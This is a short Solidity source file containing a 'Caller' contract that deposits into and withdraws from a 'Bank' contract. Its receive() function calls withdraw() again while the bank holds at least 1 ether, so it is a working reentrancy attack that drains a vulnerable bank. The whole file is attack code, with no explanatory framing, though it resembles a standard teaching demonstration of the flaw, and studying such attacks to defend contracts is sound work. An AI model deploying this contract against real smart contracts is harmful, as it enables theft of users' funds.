// SPDX-License-Identifier: MIT

pragma solidity 0.8.26;

interface Bank {
    function deposit() external payable;
    function withdraw() external;
}

contract Caller {
    address firstContract;
    constructor(address bank){
        firstContract = bank;
    }

    function depositToBank() public payable {
        Bank(firstContract).deposit{value: msg.value}();
    }

    function withdrawFromBank() public {
        Bank(firstContract).withdraw();
    }

    receive() external payable {
        if(firstContract.balance >= 1 ether) {
            Bank(firstContract).withdraw();
        }
    }
}